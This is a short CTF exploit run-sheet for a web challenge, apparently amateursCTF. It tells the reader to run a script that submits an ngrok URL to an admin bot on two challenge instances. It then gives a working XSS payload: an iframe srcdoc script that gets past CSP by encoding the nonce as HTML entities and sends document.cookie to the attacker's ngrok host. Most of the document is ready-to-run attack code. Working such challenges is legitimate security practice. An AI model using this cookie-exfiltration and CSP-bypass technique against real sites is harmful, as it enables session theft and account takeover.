# 🚀 EXECUTE NOW - Get the Flag!

## ✅ Your Setup is Ready!

- ✅ ngrok running: `https://fimbrillate-intersegmental-shelli.ngrok-free.dev`
- ✅ Port 8000 configured correctly
- ✅ query_logger.py running on port 8000

## 🎯 ONE COMMAND TO GET FLAG

Open a new terminal and run:

```bash
GET_FLAG.bat "https://fimbrillate-intersegmental-shelli.ngrok-free.dev"
```

**That's it!** The script will:
1. Submit to **BOTH instances** (a8hd38x0 and tfk6tz07)
2. Wait for the bot to visit
3. Your query_logger will show the flag

---

## 📺 Watch for the Flag

In your **query_logger.py terminal**, you'll see:

```
[timestamp] GET /?c=flag%3DamateursCTF%7B...
  - c = flag=amateursCTF{your_flag_here}
```

---

## 📋 Available Instances

The script now submits to **BOTH** instances automatically:

1. **Instance 1** (a8hd38x0): https://web-ripple-of-past-revirie-a8hd38x0.amt.rs
2. **Instance 2** (tfk6tz07): https://web-ripple-of-past-revirie-tfk6tz07.amt.rs

This doubles your chances of success!

---

## 🛠️ Advanced Options

Submit to specific instance only:

```bash
# Instance 1 only
python tools\submit_bot.py --ngrok-url "https://fimbrillate-intersegmental-shelli.ngrok-free.dev" --instance 1

# Instance 2 only
python tools\submit_bot.py --ngrok-url "https://fimbrillate-intersegmental-shelli.ngrok-free.dev" --instance 2

# Both (default)
python tools\submit_bot.py --ngrok-url "https://fimbrillate-intersegmental-shelli.ngrok-free.dev" --both
```

---

## ⚡ The Payload

```html
<iframe srcdoc="<script nonce=&quot;%&#78;4%&#43;h2wfdFxXix7rCgwhVvA%&#61;%&#61;&quot;>
window.location='https://fimbrillate-intersegmental-shelli.ngrok-free.dev/?c='+encodeURIComponent(document.cookie)
</script>"></iframe>
```

This bypasses CSP by encoding the nonce `N4+h2wfdFxXix7rCgwhVvA==` using HTML entities in the iframe srcdoc attribute.

---

## 🎯 JUST RUN IT!

```bash
GET_FLAG.bat "https://fimbrillate-intersegmental-shelli.ngrok-free.dev"
```

**GO! 🚀**
